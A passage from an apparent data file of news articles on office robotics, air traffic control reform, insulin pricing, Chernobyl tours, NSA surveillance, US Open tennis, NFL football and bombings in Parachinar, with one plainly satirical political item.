people [really] here.”\n\nNo billionaire owner, no shareholders.

There’s also the concern that artificially intelligent machines could one day become evil; robots have “Vastly more risk than North Korea,” tweeted tech entrepreneur Elon Musk.\n\nRobots have worked in industrial sites for decades, but at the office?\n\n“There’s no doubt that this has created a lot of anxiety, not just for people in the working class and front lines, but as artificial intelligence moves into American offices, it begins to affect this broader middle employment level,” said Mark Muro, a senior fellow at the Metropolitan Policy Program at the Brookings Institution who recently published a report on where the industrial robots are. (They’re mostly in Midwest states, led by Michigan, Ohio and Indiana.) “That is beginning to get a lot of people’s attention.”\n\nGetting to the era of sentient robots is tough for scientists and still a long ways off, believes Justin Davis, with Lakewood-based Gamma 2 Robotics. Gamma 2, which sells a security robot, is suffering from the backlash of Knightscope, a competitor whose own K5 security robot became a viral butt of jokes this summer after falling into an office fountain. Knightscope blamed K5’s lack of common sense after its “algorithm was unable to detect a certain wheel skid caused by the ‘loose brick surface treatment.’ ” The client was credited for a month’s service.\n\nOur D.C. office building got a security robot. It drowned itself. We were promised flying cars, instead we got suicidal robots. pic.twitter.com/rGLTAWZMjn — Bilal Farooqui (@bilalfarooqui) July 17, 2017\n\n“The singularity at which the machines become smarter than we is truly a long way off. It’s truly science fiction at this point,” Davis said. “The founders’ vision was artificial intelligence, a cybernetic brain. They wanted to architect in a way similar to a human brain but even right now, we’re years from making that. There’s still so much computing that has to happen.”\n\nMore advanced personal robots are in development, including at Boulder startup Misty Robotics. The company, which spun out of popular toy-robot maker Sphero, is working on getting a robot in every home and office.\n\n“We’re moving from highly specialized and expensive robots to much more affordable robots that are multipurpose,” said Tim Enwall, Misty’s CEO. Better sensory systems that can quickly process — or “learn” — new information are moving the world from robots that do the same task a million times to robots that can handle hundreds of tasks at home or work.\n\n“Today’s early adopter market has focused on bringing single-task robots (like Roomba) and AI devices (such as Google Home or Alexa) into their daily lives. That has helped prime early adopting consumers to being accustomed to technology being interwoven into tasks throughout the day,” Enwall said. But not everyone is ready for that, he added.\n\n“There are still several steps required for the market to grow to make way for a multipurpose robot like Misty,” he said.\n\nGamma 2’s security robot, named Ramsee, was preparing for a trial gig at a local museum in July, but that was called off after the K5 drowning incident. The museum decided it wasn’t ready for a robot security guard.\n\nThat’s not stopping Gamma 2 from moving forward. Ramsee can map the room it must patrol and follow directions, such as barking like a dog if it detects potential intruders. It identifies things that humans can’t, like carbon dioxide or poisonous gases. It sends an alarm to humans if, for example, it’s 3 a.m. and Ramsee senses motion where nothing should be moving. Ramsee can supplement a human security team or be the active guard on duty for companies with only security cameras.\n\n“If you look at menial tasks that are pervasive, like picking items in a warehouse or the delivery of fast food, these are jobs that have long been human-tasked but are not well suited for humans. Security was just the one for us that was so obvious,” Davis said. “Security companies are having to turn away business because they simply cannot staff adequately. They are (barely) minimum wage salaries and you’re asking guards to put themselves at risk. It’s reached the point where the jobs are going unfilled.”\n\nOver at the parking garage for the new PearlWest office space in downtown Boulder, a fully automated parking system designed by Park Plus has customers park and leave their car on what looks like a steel pallet. Robots slide under the pallet and transport the cars to an open parking spot. Humans aren’t allowed in “the vault” for safety reasons, said Matthew Macris, Park Plus’ director of business development. “It shuts down if it detects humans.”\n\nThe Boulder garage packs more than 60 spaces on a single level, which reduced building costs since developers didn’t need to excavate another level to meet city parking requirements. If it was a traditional garage, it would need to take up double the space in order to house the same number of cars and make room for people opening doors and walking safely out of the garage.\n\nThe number of human jobs replaced by robot parking attendants? Zero, Macris said.\n\n“We’re not taking away jobs because for the most part, (drivers) are parking their own cars,” Macris said. “We’re creating jobs at our factory and here (at headquarters) where we manage the AGVs (automated guided vehicles).”\n\nAmazon makes a case that its robots haven’t reduced the number of humans working for the online retailer. When its new 855,000-square-foot robotics fulfillment center opens in Thornton next year, it will employ 50 percent more workers than the non-robotics one in Aurora, which is 1 million square feet.\n\n“We’re at the point where we’re building Amazon fulfillment centers smaller because we can use the space better,” said Ashley Robinson, an Amazon spokeswoman, adding that the company has 25 robotics fulfillment centers worldwide. “We’re not building those multi-stories with pick pods where we have to build walkways for employees. With robotics, robots come to fulfillment associates. We can store 50 percent more inventory in a (robotics) fulfillment center. And it enables faster fulfillment speed.”\n\nFaster as in minutes compared to hours, she said. Employees no longer walk down lengthy paths to find the products needed to complete orders. They stay at their stations and wait for the robots to drop off items.\n\n“Customers have responded very positively to faster shipping,” she said. “Because of the increase (in shipping speeds), we’re able to create more jobs because we need more people packing orders. Buildings with robotics have the highest counts of fulfillment center workforce.”\n\nAmazon employed 341,400 people at the end of last year and has pledged to hire another 100,000 this year. Job-wise, Amazon is not shrinking staff even though it’s added a lot of robots and automation.\n\nStill, some critics say Amazon has put retail competitors out of business and thus indirectly contributed to mass layoffs of cashiers, store managers and restockers. But the issue has become less about automation displacing human workers. Rather, it’s that wages haven’t grown despite the U.S. experiencing some of the lowest unemployment rates in years, said Ray Hogler, a business professor at Colorado State University who studies technology’s impact on labor.\n\n“Here’s the problem. Middle-class wages have been falling for 20 years.You can see this. Google (economist) ‘Thomas Piketty.’ They talk about the levels of (wage) inequality rising. There’s no likelihood that it’s going to change,” Hogler said. “Technology is going to go where it’s going to go. There’s no way in my opinion to stop development. But what kind of institutional framework is there for dealing with the changes? That’s the big problem. … Is this driving up wages? The answer is not so far, and that’s not good.”\n\nSo what to do? Government intervention, because “if the government doesn’t do it, who is,” or unions that “can mediate the impact in a socially acceptable way,” Hogler suggested.\n\nEmployers will continue to automate when it’s more efficient and saves money, said Muro, with the Brookings Institution.\n\n“I certainly think the employment impacts really bear watching and they may well be negative, but it is also absolutely true that these technologies create new roles and new jobs and new businesses,” Muro said. “Even with a robotic plant, it hollows out the middle-skills workforce but you create roles for people to manage, maintain and program the automation.”\n\nIndeed. Jesse Gibson, who works with Morty the robotic cart at Cochlear, now focuses on other tasks, which has helped the company grow its orders and consider hiring more workers. And Morty is no longer a novelty.\n\n“You treat it like a person. You see it (coming) around the corner and try to stay out of the way,” said Gibson, “It just becomes normal. I don’t really think about it anymore. But I definitely say hello Morty.”",
  "latent_2604": "With every takeoff and every landing, there's a story.\n\nA family reunion where five generations come together across thousands of miles to convene in one location. The group photo said it all.\n\nOr a couple who met online but lived on opposite coasts. They had never even held hands before. Until they did.\n\nOr a businesswoman who presented at a meeting in Chicago (and closed the deal) — and still was able to get home to Dallas to tuck her son into bed that same night.\n\nSeemingly small stories like these are important pieces of a larger one: the story of how U.S. airlines have become an essential element of American life. Not just getting people safely and efficiently from here to there, but enabling Americans to enjoy and live life in a way impossible to imagine without access to air travel.\n\nWhen you think about what U.S. airlines achieve every day, it's easy to understand why efficiency — and using the best possible air traffic system — matters. A glimpse into a day in the life of America's airlines provides a clearer image of the vast nature of our work:\n\n27,000 flights a day across the globe\n\nNearly 50,000 tons of cargo is transported\n\n2.1 million passengers served (enough to fill the Rose Bowl about 23 times)\n\n580,000 workers — from pilots to flight attendants to rampers to mechanics — employed by the U.S. airline industry\n\nThese statistics reinforce what we know intuitively: That airlines have become an essential element of life in America — for everyday fliers and for the U.S. economy. And though our best work allows passengers to simply think about the endless travel options and book their tickets, important issues large and small determine how well the U.S. airline industry is able to serve the nation's needs.\n\nOne of the not-so-small issues before the country today is the much-needed reform of our air traffic control system. The fact is the GPS system in your car today is more technologically advanced than the system that manages our nation's airspace.\n\nThough this dated air traffic control system is the safest in the world, improvement and relentless innovation are what distinguish the United States. Good is not good enough. The ground-based technology in use today does not enable planes to fly as directly and efficiently as they otherwise could, and we're all paying the price in time and money. Flight delays and cancellations cost our country more than $30 billion every year.\n\nWe all deserve better.\n\nNextGen — a 21st century GPS satellite-based system — would make air travel more efficient, dependable and convenient. It would reduce flight delays, cancellations, aircraft noise and emissions. Real-time information between airports and aircraft would provide a better travel experience. And here's the thing: This technology has been available for years, yet we're stuck in a holding pattern, if you will, just waiting to land.\n\nWe have invested billions of dollars and countless hours to provide the FAA with operational data, participated in pilot programs and served on countless working groups, to bring this vital program to fruition. Controllers have spent years of time and effort testing and improving the system. Yet the process in place today and the federal budgeting process have resulted in our aviation system being treated like a political football. Movement forward has occurred in fits and starts. And so we wait.\n\nThe obstacles in moving more quickly and effectively to NextGen are not ones of talent or leadership or desire at the FAA. The obstacles are structural and financial. As such, we should be focused on holistic changes in structure, governance, funding and accountability that will facilitate the development of a world-class ATC organization.\n\nThis isn't just a plea for one industry. In every way, this issue has national implications. The commercial aviation industry drives 5 percent of the total U.S. economy, and one out of every 12 U.S. jobs points back to this industry. Any inefficiency, large or small, ripples well beyond the world of U.S. airlines.\n\nThis is also about keeping U.S. air travel the safest on the planet. The U.S. airline industry is in the safest period in aviation history due to the ongoing and strong collaboration among the airlines, manufacturers and government. An updated air traffic system will position us to continue this path of safety well into the future.\n\nUltimately, though, this is about real people — that family reunion, the cross-continent couple, the businesswoman on the go — being impacted by these decisions. Time-pressed Americans should know that they can count on U.S. airlines for safe, seamless and efficient flights.\n\nWe know what needs to be done. Now is the time to do it.",
  "latent_2614": "(AP Photo/Evan Vucci) Trump's nominee for HHS secretary, Alex Acar, in 2006, when he was deputy secretary of HHS.\n\nAs an exhibit of everything wrong with our corporatized health-care system, Donald Trump’s first Health and Human Services secretary is a tough act to follow. Less a pharma bro than a pharma granddad, Tom Price invested in drug makers while serving as their loyal guard dog in Congress, where he ferociously protected their public funding and bloated profit margins against regulation threats.\n\nBy nominating the pharmaceutical executive Alex Azar to succeed Price, the administration has accomplished a difficult feat, offering up an even purer embodiment of market-based health care than Price. Azar’s confirmation hearings will showcase why 53 percent of Americans now support government action to lower drug prices.\n\nRoughly 45 million people don’t fill their prescriptions because they can’t pay for them. A subset of those people can barely afford the life-saving drugs sold by Azar’s former company, Eli Lilly. During his tenure as CEO, the company jacked up the price of a fast-acting insulin product, called Humalog, from $74 to $269 per vial.\n\nBut this episode is the lesser half of a much larger scandal: Humalog’s $74 sticker price when Azar became CEO was already outrageous compared with other developed countries. In Sweden, a vial of the same medicine is reimbursed at the (still profitable) price of $18.38. The reason Eli Lilly charges so much in the United States—whether $74 or $269—is because they can. And they can because profit, not access, is the driving force in the American health-care system.\n\nAzar’s upcoming confirmation hearings will give Democratic senators the opportunity to drive home the urgency of overhauling a system whose ultimate symbol is a $269 vial of a century-old drug.\n\nIn the United States, Type 1 and Type 2 diabetes affect one in ten Americans. The production of insulin, the life-saving medicine that people with diabetes need, is essentially controlled by a cartel consisting of the firms Eli Lilly, Novo Nordisk, and Sanofi. Together they produce more than 90 percent of the world’s insulin products. The profit margins they enjoy in various markets track neatly to the ability of people with diabetes to secure a prescription for insulin products in those markets.\n\nWhere the state negotiates drug prices on behalf of a national health-care system, prices are typically much lower and access to diabetes medicines is higher. In the United States, which has abdicated its responsibility to negotiate on behalf of all Americans and ensure that everyone has access to the drugs they need, prices are the highest, and access the lowest among advanced economies.\n\nAs James Elliot noted in a recent Nation article about Azar’s Eli Lilly tenure, Americans with Type 1 diabetes spend an average of $571 every month on insulin. But many people can’t afford the amount of insulin they actually need. Instead, they risk serious harm by “stretching” their supply. Others rely on GoFundMe campaigns, or make hard choices between insulin, food, and rent. Then there are the people, some of whom Elliot names, who slip into ketoacidosis-induced comas and die because they do not have the money to pay for insulin.\n\nIn recent years, the potential of government to play a key role in bringing down prices has received fresh attention. In Louisiana, the state secretary of health has discussed petitioning HHS to forcibly break a privately held patent on a new class of Hepatitis C drugs, which would allow cheaper generic drugs to enter the market.\n\nAs a candidate, Trump routinely invoked the broad executive powers that would give him the ability to address drug prices once he was elected. However, after Trump’s first meeting with Big Pharma brass last January, the president not only forgot about those powers, but actually accused Medicare of “price-fixing.”\n\nIf only. Medicare is an important profit generator for the manufacturers of insulin. In 2015, the program expended more than $4 billion on a single insulin analogue, the second-largest expense for prescription drug reimbursement program known as Part D. (The program’s biggest outlay involved a wildly overpriced Hepatitis C drug, but that’s a separate, if very similar, drug-pricing scandal.) The federal government has not shown any willingness to intervene to reduce this cost—even though the number of diabetes patients has increased right along with insulin prices. According to the American Diabetes Association, diagnosed diabetes cost the U.S. economy $245 billion in medical expenses and reduced productivity in 2012, up from $174 billion in 2007.\n\nBut even without action at the federal level, there are ways to increase drug access, including one suggested by insulin’s origin story at a publically funded lab at the University of Toronto in 1921. Universities develop at least one-third of new drugs and, in recent years, the drug-access movement has successfully battled drug companies on campus.\n\nAt the forefront of this effort is a 15-year-old international student-driven non-profit called Universities Allied for Essential Medicines (UAEM). “We need a leader that favors people over profit to reverse the corporatization of HHS,” says Merith Basey, UAEM’s executive director for North America. “But in the meantime, we can roll back the pharmatization of universities.”\n\nBasey is uniquely qualified to steer UAEM’s efforts, using insulin as a cautionary tale. Her career in health advocacy followed years of running diabetes programs in Latin America and the Caribbean, where parents of children with Type 1 diabetes often told her they couldn’t afford the monthly insulin supply.\n\nWhen she turned to the biggest diabetes groups for help in expanding access, she found them unresponsive. The majority of diabetes groups, including the International Diabetes Federation, receive funding from the insulin cartel.\n\n“People think of insulin as this big medical success story in terms of global access, but it’s not true,” says Basey. “This generic drug has been around for almost 100 years, yet the leading cause of death for a child with Type 1 diabetes in 2017 remains a lack of insulin.\n\n“Globally,” she continues, “one in two people with diabetes lack access. Eli Lilly was a mom-and-pop company when it entered into an agreement with the University of Toronto in 1922. Now it’s part of a global monopoly.”\n\nIn 2012, Basey co-founded the 100 Campaign to re-frame insulin access as a human-rights issue and achieve full access to insulin for any American who needs it by the drug’s 100th anniversary. In 2014, Basey joined UAEM, which was founded in 2001 by veterans of the landmark victory for drug access at Yale. A coalition of students convinced the university to beat back attempts by Bristol-Myers Squibb to retain an exclusive license on a breakthrough HIV/AIDS drug created using public funds. The victory set an historic precedent and by ensuring generic competition forced steep cuts in the price of the drug.\n\nIn January 2017, UAEM celebrated a similar victory when Johns Hopkins University announced that the school would give licensing rights for a promising tuberculosis drug to the Medicines Patent Pool, and not to Sequella, the pharmaceutical company that would have acquired the license. Two years of organizing and lobbying by UAEM, Johns Hopkins students and alumni, and allies in the drug-access movement, including Treatment Action Group, Public Citizen, and Doctors Without Borders, produced the agreement.\n\n“This is what public health–driven licensing looks like,” says Basey. “If universities are pressured from within to license new drugs to bodies like the Medicines Patent Pool, which is mandated to prioritize access, affordability, and innovation, we could build a new approach to drug development, one NIH-funded university lab at a time.”\n\nThere are plenty of new drugs to protect from greedy companies. Every year, the NIH provides $34 billion in grant funding to university research centers. Researchers produce breakthrough medicines that are then snapped up by corporate drug makers, who tweak them, patent them, and claim them as their own.\n\nEconomist Mariana Mazzucato estimates that since the 1930s, the NIH has invested close to $1 trillion into the basic and applied research underlying the modern pharmaceutical and biotechnology industries. Though these firms like to boast about their “innovations” and whine about their research and development outlays, most companies take advantage of universities’ public financing for the early hard lifting, and then spend half or more of their “drug budgets” on sales and marketing.\n\nBasey believes that UAEM’s model, had it existed and enjoyed public support in 1922, would have produced in a very different insulin story. “A global access licensing movement could have pressured the University of Toronto to reach an agreement with a company that prioritized access and availability as metrics for success,” she says. “Students and researchers could have said, ‘Look, if they take this product that we researched and developed with public funding, it needs to be affordable.’”\n\nThe UAEM currently proposes that the NIH adopt a “rule of seven” for all future drug funding grants. The regulation would stipulate that licenses issued by publically funded labs could not charge more for a drug than the average price of that drug in the seven largest economies.\n\nBasey doesn’t expect NIH to adopt this rule without public pressure. But she believes more victories are possible by organizing university labs.\n\n“We need to get universities to recognize the power they draw from their position at the very start of the drug R&D pipeline,” she says. “Regardless of what’s happening in Washington, we can get them moving in a very different direction—collaborating with universities in low- and middle-income countries, following open-access principles, being transparent with funding and who they’re responsible to. We can ensure that every piece, from research choices to licensing agreements, is needs-driven, not pharma-driven.”\n\nThere is one person who epitomizes this need to revolutionize access for new drugs and time-tested ones like insulin. His name is Alex Azar, and his Senate confirmation hearings begin Wednesday morning.",

Come tour the Chernobyl nuclear power plant. Beginning next year, Ukraine plans to open up the sealed zone around the Chernobyl reactor to visitors who wish to learn more about the tragedy that occurred nearly a quarter of a century ago, the Emergency Situations Ministry said Monday.\n\nChernobyl's reactor No. 4 exploded on April 26, 1986, spewing radiation over a large swath of northern Europe. Hundreds of thousands of people were resettled from areas contaminated with radiation fallout in Ukraine, Belarus and Russia. Related health problems still persist.\n\nThe so-called exclusion zone, a highly contaminated area within a 30-mile (48-kilometer) radius of the exploded reactor, was evacuated and sealed off in the aftermath of the explosion. All visits were prohibited.\n\nToday, about 2,500 employees maintain the remains of the now-closed nuclear plant, working in shifts to minimize their exposure to radiation. Several hundred evacuees have returned to their villages in the area despite a government ban. A few firms now offer tours to the restricted area, but the government says those tours are illegal and their safety is not guaranteed.\n\nEmergency Situations Ministry spokeswoman Yulia Yershova said experts are developing travel routes that will be both medically safe and informative for Ukrainians as well as foreign visitors. She did not give an exact date when the tours were expected to begin.\n\n\"There are things to see there if one follows the official route and doesn't stray away from the group,\" Yershova told The Associated Press. \"Though it is a very sad story.\"\n\nThe United Nations Development Program chief Helen Clark toured the Chernobyl plant together with Baloha on Sunday and said she supported the plan because it could help raise money and tell an important lesson about nuclear safety.\n\n\"Personally I think there is an opportunity to tell a story here and of course the process of telling a story, even a sad story, is something that is positive in economic terms and positive in conveying very important messages,\" said Clark, according to her office.\n\nThe ministry also said Monday it hopes to finish building a new safer shell for the exploded reactor by 2015. The new shelter will cover the original iron-and-concrete structure hastily built over the reactor that has been leaking radiation, cracking and threatening to collapse.\n\nThe new shell is 345 feet (105 meters) tall, 853 feet (260 meters) wide and 490 feet (150 meters) long. It weighs 20,000 tons and will be slid over the old shelter using rail tracks. The new structure will be big enough to house the Notre Dame Cathedral in Paris or the Statue of Liberty in New York.\n\nThe overall cost of project, financed by international donors, has risen from $505 million (euro380 million) to $1.15 billion (euro870 million) because of stricter safety requirements, according to Ukrainian officials.\n\nThe European Bank for Reconstruction and Development, which manages the project, said a final estimate of the project's cost will be released after the French-led consortium Novarka finalizes a construction plan in the next few months.",

  "latent_3003": "NSA Appears To Be Chaining Calls Using Phone Numbers One Hop Out As New Originating Selectors\n\nfrom the making-any-hop-limitations-pointless,-at-least-for-Clapper's-chain-gang dept\n\nIn that same motion it implemented the change in standard dragnet language that has been retained in these more recent dragnet orders: the NSA is chaining on “connections” as well as actual calls.\n\n14 The first “hop” from a seed returns results including all identifiers (and their associated metadata) with a contact and/or connection with the seed. The second “hop” returns results that include all identifiers (and their associated metadata) with a contact and/or connection with an identifier revealed by the first “hop.\n\nQueries of the BR metadata using RAS-approved selection terms for purposes of obtaining foreign intelligence information may occur by manual analyst query only.\n\nWhether Administration witnesses were being deliberately deceitful when testifying about call-based chaining (“not wittingly!”) or the NSA only recently resumed doing connection based chaining manually, having given up on doing it automatically, one thing is clear. The NSA has been doing connection based chaining since at least February, and very few people in Congress know what that means. Nevertheless, they’re about to authorize that formally.\n\nThe ODNI's first transparency report put a lot of not very reassuring numbers on display, misusing the word \"target\" to give the impression that Section 702's ~90,000 targets were actually limited to 90,000 people, rather than, say, several thousand collection points gathering data and communications from severalunspecified targets.The ODNI also claimed it couldn't offer specifics on the number of people targeted by the 19,000+ NSLs issued last year, even while pointing to letters sent to Intelligence Committees and members of the administration that attempted to do exactly that. A caveat was appended to the 2013 letters, noting that the FBI's NSL target estimates were probably inflated due to the NSL's limitations and targeting specifications.But there are further statistical \"anomalies\" hidden within the transparency report. The section detailing the business records program (aka, Section 501 [formerly Section 215]) listed a small number of targets as well, something entirely at odds with the NSA/FBI's demands forphone record from certain providers. While there are only a certain number of RAS (reasonable articulable suspicion) approved selectors that can be used by the NSA to search the bulk records, there's apparently a workaround that allows analysts to access many more records within the database.Marcy Wheeler of emptywheel spotted some wording in the two most recent FISA court orders (released late Friday afternoon) that confirms the agency is using numbers one hop out from the RAS-approved numbers as additional selectors , triggering even more contact chaining.If it's any consolation, this new chains-upon-chains method apparently can't be performed automatically, most likely due to these automated searches not complying with FISA court limitations (rather than a lack of computing ability). The most recent bulk records orders note that these searches will now always be performed manually.As Wheeler notes, this wording may also indicate the agency's anticipation of bulk records being maintained and held by service providers, thus further limiting its splashing around in the collected metadata. But it does indicate that the recently-imposed \"hop\" limitation is nearly useless. Rather than simply searching one hop out from the RAS selector, the agency is having its analysts build contract chains starting from that hop and moving outward. This puts the agency right back where it was prior to the minimal restrictions placed on it by the administration's reform measures.It's not a strictly legal move, no matter if it's automated or not. Feinstein's fake reform measures would have codified this quasi-legal procedure, as Wheeler points out. Denials offered by NSA officials may have had a slight ring of truth, especially if the automated system wasn't capable of meeting FISC stipulations, but it appears to be all systems go at this point.What the NSA buries in half-truths, carefully-worded denials and artful retractions always has the chance to become legally sanctioned by efforts like Feinstein's, which seek to codify the NSA's programs and instantly whitewash any past brushes with illegality. The NSA plays to edges of the letter of the law and disregards the spirit. Even its past excesses and deliberate misuse of its powers have failed to keep it down for long. At worst, it's back to its 2008 form, dealing with the same sort of limitations FISC Judge Walton imposed on it after uncovering years of abuse . But it has more contacts to chain than it did previously, thanks to its manual search method, even with reform efforts taking away one of its hops.\n\nFiled Under: chaining. phone numbers, nsa, selectors, surveillance",
  "latent_3087": "NEW YORK—Grasping for any way to halt the Democratic candidate’s momentum, a coalition of wealthy donors reportedly pumped millions of dollars into Bernie Sanders’ presidential campaign this week in a last-ditch effort to destroy his credibility. “Unfortunately, our attempts to attack his message and brand him as a radical have had little effect on his poll numbers, so the only option left on the table was a massive, coordinated barrage of maximum-level contributions directly to his campaign,” said hedge fund manager Robert Mercer, who, along with hundreds of other high-net-worth investors and major financial corporations, has funded a new super PAC known as Corporate America For Bernie, which has already debuted a series of laudatory, pro-Sanders television and radio ads aimed at undermining the candidate. “Our strategy is to hit Bernie with a few million in direct support in New Hampshire, and then unleash an all-out flood of money into his pocket in the run-up to Super Tuesday. We have the resources to keep funding him for as long as it takes to get him out of the race. I can assure you that we will not hesitate to give upwards of $5 million or even $10 million apiece to Bernie’s campaign if that’s what it takes to stop Bernie’s campaign.” At press time, the newly cash-flush Sanders campaign was launching a series of attack ads targeting its own excessive wealth and influence.\n\nAdvertisement",
  "latent_3286": "At long last, the Wild Cards for the US Open mens singles draw have been released. They are as follows:\n\nMain Draw\n\n1. Jared Donaldson USA\n\n2. Bjorn Fratangelo USA\n\n3. Ryan Harrison USA\n\n4. Austin Kraijeck USA\n\n5. Ryan Shane USA\n\n6. Frances Tiafoe USA\n\n7. Pierre-Hughes Herbert FRA (FFT)\n\n8. Lleyton Hewitt AUS (TA)\n\nQualifying\n\n1. Taylor Fritz USA\n\n2. Marcos Giron USA\n\n3. Stefan Kozlov USA\n\n4. Mitchell Krueger USA\n\n5. Michael Mmoh USA\n\n6. Reilly Opelka USA\n\n7. Tommy Paul USA\n\n8. Noah Rubin USA\n\n9 TBD (National Playoffs champion)\n\nUS Open Wild Cards: Hits, Misses, and Insults\n\nSome of these choices were to be expected. It seemed obvious with the collaboration between Tennis Australia and the USTA that Lleyton Hewitt would receive a WC for his final USO. Ryan Shane was the winner of the NCAA Championship (who always receives a WC if he’s an American), and Bjorn Fratangelo won the USTA Wild Card Challenge. As a result, these two were rewarded WCs. It was also no surprise to see 18 year old Taylor Fritz, the Roland Garros Junior Boys Champion in the list of QWCs.\n\nFrancis Tiafoe, a 17 year old from Maryland, is the youngest Orange Bowl Champion in history. He is said to be the next great American player. He played his first Slam main draw at Roland Garros this year and has received a WC into the US Open main draw as well. He was awarded his WC for earning the most points at the American summer Challengers.\n\nOther interesting young prospects were given QWCs suchs as Stefan Kozlov (17), Micael Mmoh (17), Tommy Paul (18), Riley Opelka (17), and Noah Rubin (19).\n\nThe choice that has seemed to cause a lot of buzz is Ryan Harrison for a multitude of reasons. For starters, despite an encouraging run in Acapulco which saw Harrison take out then World #11 Grigor Dimitrov, he has shown almost no results that warrant him a WC. He has failed to win a tour level match since this spring and a lot of his matches have been one sided defeats.\n\nFor the fourth time in five years, Ryan Harrison gets a WC into the US Open. Not sure what he has done recently to deserve one though… — Ian DW (@sportdw) August 18, 2015\n\nControversy has surrounded him after his qualifying match in Cincinnati against Australian teenager Thanasi Kokkinakis. Both had various controversial exchanges throughout the match, and after the match Harrison stated: “Wawrinka should’ve decked Kyrgios, and I should deck that kid.” There is no doubt that Harrison made a reference to the spat between Kyrgios and Wawrinka the previous week. Many believe that this sort of behavior should deprive him of a WC.\n\nIn addition, Robby Ginepri and Michael Russell are both retiring following the US Open, so it can be argued that they are more deserving of the WC than Harrison is. It is a fair argument considering Harrison will have many more opportunities in the future to prove himself while these two do not. Ginepri, a former World #15, has won three ATP tour titles in his career and has had multiple Slam successes including a run to the US Open semifinals back in 2005, losing in five sets to Andre Agassi. So not only is he an American player about to retire, but a former semifinalist at this event. Michael Russell at the age of 37 has a career high of World #60 but has reached the second week of a major before. During that run, he held match match points against Gustavo “Guga” Kuerten, the eventual champion of the event at Roland Garros in 2001. Neither are young nor are they household names so they will often be ignored in discussions like this. I do believe that they deserve a shoutout in this discussion as it never feels good to be dismissed by your nation’s biggest tournament after giving your life to this sport. Contrary to belief, neither should be dismissed as “nobodies” and both had moments in the spotlight that made American tennis proud. But it is all up for debate.\n\nMain Photo:",
  "latent_3315": "John Fennelly, SNY.TV Facebook | Twitter | Tumblr | | Archive Posts\n\nThe Giants will face the Dallas Cowboys this Sunday afternoon with rookie Dak Prescott at QB in place of the injured Tony Romo. Ben McAdoo, making his regular season debut as Giants head coach, isn't taking Prescott lightly.\n\n\"Dak is a winner. He's won everywhere he's been,\" said McAdoo of the former Mississippi State star on Monday. \"He has taken advantage of his opportunities in the preseason and it'll be a challenge for us...He's looked good in the preseason and he's done a nice job for them. We're going to have our hands full. He's a good player.\"\n\nThe Giants will be looking to defend Prescott with a retooled defense that includes some major changes throughout. The club released veteran LB Jasper Brinkley on Monday to make room for QB Josh Johnson. That means Kelvin Sheppard could be the new starting MLB.\n\n\"It just came down to it's a numbers game at this point,\" explained McAdoo. \"It came down to numbers. We thank Jasper for everything he's done for us. Coming in playing last year off short notice, he did a nice job for us. We wish him the best.\"\n\nMcAdoo also said Sheppard would be the MLB depending on the package DC Steve Spagnuolo calls. Keenan Robinson, Mark Herzlich and rookie B.J. Goodson will all see reps as well.\n\nInjuries...LB Jonathan Casillas (ribs) and rookie safety Darian Thompson (shoulder) returned to practice, but were limited. McAdoo said Casillas could be turned loose on Wednesday but Thompson will be testing out a harness and remain limited for the time being. McAdoo also said DB Leon Hall and Goodson were still going through the league's concussion protocol process.\n\nQuick quotes...\n\nOn the Giants' interest in former Green Bay Packers OL Josh Sitton...\"You look at everything. I have history with Josh. Tremendous player, tremendous talent. We wish Josh nothing but the best but he's not on our roster.\"\n\nOn newly-signed QB Josh Johnson...\"He has good rhythm in his body. He's been trained in a version of the system. He plays with his cleats in the ground, has a natural throwing motion and has some good experience.\"\n\nOn OT Will Beatty...\"I look forward to going in and watching the film. He did some good things out here today. It's encouraging.\"\n\nOn if the Giants will look for offensive line help this week via the waiver wire...\"No. Again, we're comfortable with the players we have on this roster right now. We have a good, strong football team. You never stop looking, but we're definitely comfortable with what we have.\"\n\nOn DT Robert Thomas, who the Giants picked up this past weekend off the waiver wire...\"He plays with great energy. Leverage, he stays on his feet. Tremendous balance and he uses his hands well. He's active. Good player, glad to have him.\"",
  "latent_3329": "The boys with tin buckets of coal will protect you from misfortune. They sprinkle Spalanaey or wild rue seeds on the embers, and in tiny priestly waves coax its fragrant smoke from these homemade censers to chase off the evil eye. Some poverty-stricken children in Parachinar who have lost their fathers in bomb blasts have turned to this work to earn a living of sorts. They would rather do this for a few rupees than beg. Shopkeepers call out to them, “Ay spailanay wala aw lugay ka.” Come burn some for us.\n\nExcept in Parachinar there is far greater evil afoot than that which a few seeds may keep at bay.\n\nSit-in\n\nOn June 23, twin bomb blasts killed 72 people and injured 225 others in Parachinar’s central Punjabi bazaar in Upper Kurram Agency. The process of gathering data on the toll was still underway when we went to press, as many patients were taken to Peshawar. People say some bodies have not been found. “They were naked, no clothes,” says Ghayur Ali, who picked up five. “People were ripping the canopies off shopfronts to use as stretchers.” Others were rushed to the Agency Headquarter hospital on carts. In Parachinar, when there is a bomb blast, people run to it and not away. This time though, it was a double-tap. The rescuers themselves succumbed in the second explosion as women looked on horrified from the rooftops.\n\nThis was the third attack so far this year. Maddened men, around fifty of them, rushed to the Political Agent’s office to protest. What happened next is being investigated. The Frontier Constabulary (FC) jawans posted there are accused of allegedly opening fire on the protestors. Three men were killed and 13 were injured.\n\n“No one ever thought they would open fire,” says H. Haider, one of the 13, who is recovering from a gunshot wound to the foot at the AHQ. “They could have done aerial firing,” he says. “We were going to protest against the people who did the bombings, not the FC. And they knew that as we were in the red zone, we would be unarmed.” H. drives a rickshaw and earns about 300 rupees a day.\n\nOn a bed opposite H. is Asif Ali, who works in a bakery making kurramwallay mithai. They make fun of him in a gentle way because his case defies logic. He has the dubious honour of surviving three bomb blasts this year, on January 21 (25 killed), March 31 (23 killed), and June 23 (~72 killed). Mehdi Hussain Turi explains the smiles: “There is an insect that you’ll find in wheat. But after you separate the chaff, you will still find it crawling around. We call Asif the matchke [insect] after it.” In the earlier attacks Asif lost an uncle and a cousin. As details of his miraculous survivals are recounted by friends surrounding his bed, he cocks his head with a bemused look. He can’t hear because his ear was damaged. He lifts his shirt to show the baby pink burns. We cannot talk to him. He smiles. We smile back.\n\nThat night, after the dead were buried, one man decided something. By 3am when he had finished the ghusl or last rites for the last body, 33-year-old political worker Muzammil Agha went back to the road outside the Political Agent’s office and sat down. “Whenever we have a bomb blast I go straight to the mortuary,” he says. “When I was done at 2:30am, I took a blanket and pillow and went to protest.” He would not move until something gave. It was just him and handful of men. But then the numbers swelled into what would perhaps become the most successful dharna in this area’s history.\n\nExcept, when it started, on that night and some nights to come, no one was listening in non-Parachinar land.\n\nRoad to the end of Pakistan\n\nNear Hangu en route to Parachinar, somewhere in Pakistan, three words appear in white on the side of a hill: Ya Ali Madad. And depending on what is happening here, they can be a plea, a war 